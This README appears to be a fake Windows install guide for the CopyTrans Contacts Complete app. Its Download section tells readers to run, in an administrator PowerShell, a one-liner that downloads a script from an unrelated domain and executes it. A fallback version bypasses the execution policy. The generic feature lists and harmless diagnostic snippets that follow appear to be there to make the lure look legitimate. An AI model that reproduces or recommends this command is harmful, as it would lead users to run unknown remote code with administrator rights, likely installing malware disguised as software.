# CopyTrans Contacts Complete — Windows desktop guide

Windows 10 and 11 · desktop workflows, panels, and daily tools (copytrans-contacts-app, desktop-utility, windows-tools)

## Preview

**CopyTrans Contacts Complete** on **Windows 10 and 11** — desktop workflows, panels, and daily tools (copytrans-contacts-app, desktop-utility, windows-tools).

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

This README documents **CopyTrans Contacts Complete** on Windows 10 and 11: deployment order, first-run checks, and everyday use. Start in **Download**, then review FAQ and features.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Open **PowerShell as Administrator** and use the command in the **Download** section above. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during setup. |
| What is this repo? | Reference for **CopyTrans Contacts Complete** on Windows — overview, download steps, and optional diagnostics. Third-party software; follow vendor licensing. |

## Features

- Quick actions
- Batch tools
- Status panels
- Profiles
- Search
- File tools

## Use cases

- Power users
- IT support
- Home labs

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "CopyTrans-Contacts-Complete"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Post-install (application layer)**

```powershell
Get-Process -Name "CopyTransCon*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## Topics

`copytrans-contacts` · `copytrans-app` · `copytrans-contacts-app` · `desktop-utility` · `windows-tools` · `how-to-install-copytrans` · `how-to-setup-copytrans` · `desktop-package` · `windows-11` · `windows-10`

## License

This repository describes installation and usage of a third-party desktop application. Comply with applicable software licensing and local regulations.
